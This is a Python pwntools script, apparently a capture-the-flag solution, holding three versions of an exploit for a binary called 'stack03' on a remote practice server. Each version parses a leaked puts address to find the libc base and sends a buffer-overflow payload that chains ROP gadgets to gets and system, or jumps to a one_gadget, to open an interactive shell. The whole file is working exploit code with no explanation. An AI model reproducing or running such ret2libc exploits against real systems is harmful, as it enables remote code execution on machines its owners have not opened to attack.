from pwn import *


def stack03():
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('/home/was_4/Downloads/libc-64.so')

    # r = process('/home/was_4/Downloads/stack03')
    context.binary = '/home/was_4/Downloads/stack03'
    r = remote(host='pwnable.hso-hacker.space', port=20003)
    # gdb.attach(r.pid)

    data = r.recvline().decode()
    print(data)
    address = re.findall(r'0x([a-f0-9]+)', data)[0]
    addressPuts = int(address, 16)

    # ibCOffsetGets = libc.symbols['puts'] - libc.symbols['gets']
    libCBase = addressPuts - libc.symbols['puts']
    libCGets = libCBase + libc.symbols['gets']
    libCSystem = libCBase + libc.symbols['system']

    print(hex(libCBase))
    print(hex(libCGets))

    freeSpace = 0x601060

    popRdi = 0x00000000004006f3
    test = 0x0000000000400714

    payload = b'A' * 0x68 + p64(popRdi) + p64(freeSpace) + p64(libCGets) + p64(popRdi) + p64(freeSpace) + p64(libCSystem)

    r.sendline(payload)
    r.interactive()


def stack03_version2():
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('/home/was_4/Downloads/libc-64.so')

    # r = process('/home/was_4/Downloads/stack03')
    context.binary = '/home/was_4/Downloads/stack03'
    r = remote(host='pwnable.hso-hacker.space', port=20003)
    # gdb.attach(r.pid)

    data = r.recvline().decode()
    print(data)
    address = re.findall(r'0x([a-f0-9]+)', data)[0]
    addressPuts = int(address, 16)

    # ibCOffsetGets = libc.symbols['puts'] - libc.symbols['gets']
    libCBase = addressPuts - libc.symbols['puts']
    libCSystem = libCBase + libc.symbols['system']

    print(hex(libCBase))

    freeSpace = libCBase + 0x00000000001619D9

    popRdi = 0x00000000004006f3
    test = 0x0000000000400714

    payload = b'A' * 0x68 + p64(popRdi) + p64(freeSpace) + p64(libCSystem)

    r.sendline(payload)
    r.interactive()


def stack03_version3():
    # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc = ELF('/home/was_4/Downloads/libc-64.so')

    # r = process('/home/was_4/Downloads/stack03')
    context.binary = '/home/was_4/Downloads/stack03'
    r = remote(host='pwnable.hso-hacker.space', port=20003)
    # gdb.attach(r.pid)

    data = r.recvline().decode()
    print(data)
    address = re.findall(r'0x([a-f0-9]+)', data)[0]
    addressPuts = int(address, 16)

    # ibCOffsetGets = libc.symbols['puts'] - libc.symbols['gets']
    libCBase = addressPuts - libc.symbols['puts']
    libCOne_Gadget = libCBase + 0x3f306

    print(hex(libCBase))

    payload = b'A' * 0x68 + p64(libCOne_Gadget)

    r.sendline(payload)
    r.interactive()